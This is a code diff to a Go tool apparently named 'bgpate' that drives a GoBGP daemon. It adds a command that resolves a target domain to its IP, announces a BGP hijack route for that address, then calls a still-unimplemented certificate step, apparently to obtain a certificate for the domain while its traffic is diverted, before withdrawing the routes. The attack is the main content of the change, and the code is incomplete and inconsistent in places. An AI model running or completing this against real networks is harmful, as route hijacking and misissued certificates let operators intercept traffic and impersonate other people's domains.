@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"net"
 
 	api "github.com/osrg/gobgp/v3/api"
 	"bgpate/pkg/ripe"
@@ -317,9 +318,39 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 	return nil
 }
 
-func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string) error {
-	// TODO: Implement certificate generation logic
-	fmt.Printf("Generating certificate for domain: %s\n", domain)
+func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Context, domain string, dryrun bool) error {
+	// trying to resolve domain to ip
+	ips, err := net.LookupIP(domain)
+	if err != nil {
+		return fmt.Errorf("failed to resolve domain: %v", err)
+	}
+	fmt.Printf("Resolved domain: %s to IPs: %v\n", domain, ips)
+	if len(ips) > 1 {
+		return fmt.Errorf("multiple IPs found for domain: %s", domain)
+	} 
+	ip := ips[0]
+	// hijack routes
+	if err := hijackRoutes(client, ctx, ip.String(), dryrun); err != nil {
+		return fmt.Errorf("failed to hijack routes: %v", err)
+	}
+
+	// TODO: Generate certificate
+	if err := generateCertificate(client, ctx, domain, dryrun); err != nil {
+		return fmt.Errorf("failed to generate certificate: %v", err)
+	}
+
+	// If it is a dryrun, we don't need to clear routes
+	if dryrun {
+		fmt.Println("Hijacked successfully")
+		return nil
+	}
+
+	// clear routes
+	if err := clearRoutes(client, ctx); err != nil {
+		return fmt.Errorf("failed to clear routes: %v", err)
+	}
+	fmt.Println("Hijacked successfully")
+	
 	return nil
 }
 
@@ -330,7 +361,7 @@ func main() {
 	}
 
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
+		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] - Generate certificate for specified domain")
 	}
 
 	// Connect to GoBGP daemon
@@ -373,18 +404,18 @@ func main() {
 			fmt.Errorf("failed to clear routes: %v", err)
 		}
 		fmt.Println("Hijacked successfully")
-		
 
 	case "certgen":
 		if len(os.Args) < 3 {
-			log.Fatal("Usage: go run main.go certgen <domain>")
+			log.Fatal("Usage: go run main.go certgen <domain> [--dryrun]")
 		}
 		domain := os.Args[2]
-		if err := generateCertificate(client, ctx, domain); err != nil {
+		dryrun := len(os.Args) > 3 && os.Args[3] == "--dryrun"
+		if err := generateCertificateWithHijack(client, ctx, domain, dryrun); err != nil {
 			log.Fatalf("Failed to generate certificate: %v", err)
 		}
 
 	default:
-		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain>")
+		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun]")
 	}
 } 
